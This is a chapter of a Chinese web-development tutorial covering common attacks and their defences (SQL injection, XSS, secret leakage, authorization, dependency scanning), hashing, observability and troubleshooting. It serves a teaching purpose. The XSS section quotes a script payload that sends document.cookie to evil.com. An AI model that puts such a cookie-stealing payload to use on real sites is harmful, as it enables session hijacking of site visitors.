## $\rm \S \, 32.1$ 日常防御

你不需要成为安全专家才能防御最常见的攻击。Web 应用最常被攻击的五条路径：

### $\rm \S \, 32.1.1$ SQL 注入

在[SQL 从零开始](../07-应用开发/26-SQL从零开始.md)中你用一个具体例子看到了 SQL 注入的破坏力。防御只需一条规则：**永远用参数化查询，永远不拼接用户输入构造 SQL**。

### $\rm \S \, 32.1.2$ XSS（跨站脚本攻击）

用户输入了一段文本 `"<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"`，你的前端把它直接插入 DOM——这段脚本在访问者的浏览器中执行。

防御：**永远不把用户输入直接插入 HTML**。React 默认对所有变量进行 HTML 转义（`<` 变成 `&lt;`），Vue 同理。如果你确实需要渲染用户提供的 HTML（如 Markdown 渲染），用专门的清洗库（如 DOMPurify）。

### $\rm \S \, 32.1.3$ 敏感数据泄露

你给队友发了一段代码：

```python
DATABASE_URL = "postgresql://admin:MyP@ssw0rd@db.example.com/paperdb"
```

这段代码被提交到了公开的 GitHub 仓库。Git 历史是永久的——即使你在下一个 commit 删掉了这行，任何人都可以 checkout 到旧 commit 看到密码。

防御：**敏感信息永远不进入源码**——用环境变量、Secret 管理服务（如 GitHub Secrets）、或加密的配置文件（如 Ansible Vault）。如果已经泄露，立即轮换密钥/密码（在服务商端生成新的——仅仅删除旧文件不够）。

`.env` 和 GitHub Secrets 保护的是**项目**的密钥。你自己个人的密钥（GitHub Token、数据库密码）存在哪里？不是 `notes.txt`——那是明文，还会被同步软件带上云。用**密码管理器**：**Bitwarden**（开源，免费额度够用，可自托管）或 **1Password**（体验精致，付费）。两者都有命令行工具（`bw`、`op`），可以把取密钥写进脚本——比翻笔记快，也比明文文件安全。

### $\rm \S \, 32.1.4$ 认证与授权缺陷

你的 API 有认证（知道你是谁）但没有授权（检查你有没有权限做这件事）。用户 A 登录后修改了 URL 中的 ID：`DELETE /api/papers/42`——删除了用户 B 创建的论文 42。

防御：**每个涉及资源的操作都要检查“当前用户是否有权限”。** 不能只在前端隐藏删除按钮——攻击者可以直接用 curl 发 DELETE 请求。

### $\rm \S \, 32.1.5$ 依赖漏洞

你的 `requirements.txt` 中有 50 个包——其中 5 个有已知安全漏洞，2 个已经两年没有更新了。攻击者扫描到你的应用使用了某个存在 RCE（远程代码执行）漏洞的旧版本库。

防御：**定期扫描依赖**（`pip-audit`、`npm audit`），升级有安全补丁的包，移除不再维护的依赖。

### $\rm \S \, 32.1.6$ 哈希与校验

[文本、编码、压缩包与常见数据格式](../02-终端与工具/06-文本编码压缩包与数据格式.md)中你已经用哈希验证过下载文件。那里的直觉在这里升级成安全工具：**哈希函数**（hash function）把任意长度的输入映射为固定长度的输出——SHA-256（Secure Hash Algorithm 256）的输出永远是 256 比特（64 个十六进制字符），输入是 `"abc"` 还是整个系统镜像都一样。它的两个性质分别支撑两件事：

1. **相同输入必定相同输出**——验证完整性。`sha256sum 下载的文件` 和发布方公布的哈希一致，说明文件一个字节都没被改动。
2. **找不到两个不同输入产生相同输出**（碰撞，collision；准确说是“计算上不可能找到”）——防伪造。攻击者无法构造一个内容不同、哈希却恰好相同的“替身文件”来冒充你的发布物。

Git 的每个 commit 本质上就是一个 SHA-1 哈希：对提交内容、作者信息和父提交哈希整体计算——所以文件哪怕改一个字节再提交，commit ID 就完全变了，历史无法悄悄篡改（详见 [Git 与团队协作](../05-开发工作流/19-Git与团队协作.md)）。

**HMAC**（Hash-based Message Authentication Code，基于哈希的消息认证码）是带密钥的哈希：只有持有同一密钥的人才能算出相同的摘要。它既验证完整性（内容没被改）又验证身份（确实是持有密钥的一方）——HTTPS 的 TLS 握手和很多 API 签名都基于它。

## $\rm \S \, 32.2$ 可观测性：三根支柱

“为什么网站慢了”不能靠猜。你需要证据。三种证据类型构成可观测性：

### $\rm \S \, 32.2.1$ 日志（Logs）：记录发生了什么

```
[2026-03-15T14:32:01.123Z] [INFO] [req-abc123] GET /api/papers?tag=transformer → 200 (23ms)
[2026-03-15T14:32:02.456Z] [ERROR] [req-def456] POST /api/papers → 500: Database connection timeout (5000ms)
```

好的日志包含：时间戳（毫秒级）、级别、唯一请求 ID、做了什么、结果和耗时。不好的日志是 `cout << "error" << endl`——没有时间、没有请求 ID（没法关联到具体是哪个用户的操作）、没有上下文。

### $\rm \S \, 32.2.2$ 指标（Metrics）：量化“系统整体怎么样了”

- **QPS**（Queries Per Second）：每秒收到多少个请求。突然从 10 跳升到 1000——是正常流量还是 DDoS（Distributed Denial of Service，分布式拒绝服务攻击）？
- **P50/P95/P99 延迟**：50%/95%/99% 的请求在多少毫秒内完成。P50=50ms 但 P99=5000ms 表示“大部分请求很快，但少数请求极慢”——可能是数据库锁等待或 GC（Garbage Collection，垃圾回收）暂停。
- **错误率**：5xx 响应的比例。超过 1% 需要立即关注。

### $\rm \S \, 32.2.3$ 链路追踪（Traces）：一个请求走了哪些路

用户的一个 `GET /api/papers` 请求经历了：Nginx（1ms）→ 后端路由（0.5ms）→ 参数校验（0.1ms）→ 数据库查询（18ms）→ JSON 序列化（2ms）。链路追踪让你看到**瓶颈在哪一步**——而不是猜“应该是数据库慢吧”。

### $\rm \S \, 32.2.4$ 工具速览

| 工具 | 定位 | 起步难度 |
|---|---|---|
| **Sentry**（sentry.io） | 错误追踪——自动收集 crash 堆栈和上下文 | 低（SDK 一行代码） |
| **Grafana + Prometheus** | 指标 + 仪表板 | 中（需配置导出器） |
| **ELK Stack**（Elasticsearch + Logstash + Kibana） | 集中式日志搜索 | 高（维护成本高） |
| **OpenTelemetry**（opentelemetry.io） | 统一可观测性标准——日志/指标/链路一把抓 | 中 |
| **Uptime Kuma** | 自托管健康检查和告警 | 低（Docker 一键启动） |

## $\rm \S \, 32.3$ 故障排查：从现象到根因

### $\rm \S \, 32.3.1$ 五类信号，五个问题

出问题时，按顺序问：

1. **现象是什么？** 用户说“网站打不开”——具体是什么？白屏？500 错误？一直转圈？
2. **时间范围？** 什么时候开始的？持续了多久？自己恢复了还是还在持续？
3. **影响范围？** 所有人还是个别用户？所有功能还是只一个页面？
4. **最近有什么变化？** 部署了新版本？改了数据库？改了配置文件？流量突然增加？
5. **哪一层出问题？** 回顾[域名、HTTPS、代理与排障](../04-网络/24-域名HTTPS代理与排障.md)中的分层排障框架——DNS → TCP → TLS → HTTP → 应用 → 数据库，从下往上逐层排除。

### $\rm \S \, 32.3.2$ 常见故障模式

| 症状 | 第一检查 | 命令 |
|---|---|---|
| “网站完全打不开” | 服务是否在运行？ | `docker ps` / `systemctl status` |
| “加载极慢” | 数据库连接池是否耗尽？ | `docker stats` + `htop` |
| “偶尔 500” | 后端日志中的错误 | `docker compose logs backend \| grep ERROR` |
| “搜索没结果” | 数据库是否有数据？索引还在吗？ | `psql` → `SELECT COUNT(*) FROM papers` |
| “磁盘满了” | 日志是否没轮转？ | `df -h` / `du -sh /var/lib/docker` |
| “内存不足” | 哪个容器吃内存？ | `docker stats` → `pmap -x PID` |

### $\rm \S \, 32.3.3$ 故障复盘

每次故障修复后，不是“还好修好了”就翻篇。花五分钟记录：

1. 发生了什么（一句话）。
2. 第一信号是什么（用户报告 / 监控告警 / 自己发现）。
3. 根因是什么（不要写“数据库挂了”——为什么挂？连接池耗尽了还是磁盘满了？）。
4. 修复做了什么。
5. 怎样防止复发（加监控、加限流、加自动化恢复）。

这份“故障报告”是团队最宝贵的知识资产——下次类似故障就不需要从头排查。

## $\rm \S \, 32.4$ 动手实践

### 实践一：故意制造故障

在你的 Docker Compose 部署中：

1. 故意把后端端口号写错（参考[日常系统管理：软件、用户、服务与日志](../03-计算机系统/13-系统服务日志与软件安装.md)中的故障演练）。
2. 用 `docker compose logs` 找到错误。
3. 用分层排障方法（TCP → HTTP → 应用 → 数据库）定位根因。

### 实践二：添加基础可观测性

1. 在你的后端中添加请求日志（记录每个请求的方法、路径、状态码和耗时）。
2. 安装 Uptime Kuma，配置对 `https://papers.example.com/api/health` 的监控。
3. 故意停止后端，确认 Uptime Kuma 发出告警。

### 实践三：安全审计

1. `pip-audit` 扫描 Python 依赖的安全漏洞。
2. 检查你的代码中是否有硬编码的密码/Token/连接字符串。
3. 检查 Git 历史中是否有敏感信息（`git log -p | grep -i password`）。

## $\rm \S \, 32.5$ 总结

- **安全五条**：防注入（参数化查询）、防 XSS（HTML 转义）、不泄露密钥、检查授权（不只是认证）、扫描依赖漏洞。
- **可观测性三根支柱**：日志（发生了什么）、指标（系统整体怎么样）、链路追踪（一个请求走了哪些路）。
- **排障**：现象→时间→范围→变化→逐层排除。复盘记录比修复本身更有长期价值。

## $\rm \S \, 32.8$ 本章自测答案

> 先闭卷作答本章“关键概念回顾”与“应用与辨析”，再核对以下答案。

### 自测答案 · 关键概念回顾
1. 参数化查询把用户输入当作数据值而不是 SQL 代码的一部分。数据库在解析 SQL 语句结构后，将参数值填入已解析的查询计划——用户输入中的任何 SQL 关键字都不会被解释为命令。
2. 日志回答“发生了什么”（离散事件），指标回答“系统整体怎么样了”（聚合统计），链路追踪回答“一个请求走了哪些路、瓶颈在哪一步”。
3. Git 历史是永久的——所有历史 commit 中仍然保存着泄露的数据。必须立即在服务端轮换密钥/密码（即生成新的并废弃旧的）。

### 自测答案 · 应用与辨析
4. ①检查后端容器是否在运行（`docker ps`）→ ②检查后端日志中是否有错误（`docker compose logs backend`）→ ③如果后端在运行且无错误，检查反向代理配置中的 proxy_pass 地址是否正确（后端容器 IP 是否变了）。
5. 两者都源于把不可信的数据当作可执行代码来处理。SQL 注入把用户输入当作 SQL 执行；XSS 把用户输入当作 JavaScript 执行。防御的共同思路是“数据和代码严格分离”。
6. 大部分请求很快（20ms），但有 1% 的请求极慢（8 秒）。这通常不是“系统整体慢”，而是特定条件触发的问题——可能是某类查询没有索引、数据库锁等待、或外部 API 调用偶尔超时。排查方向：找 P99 请求的共同特征（相同的查询参数？相同的时间段？）。
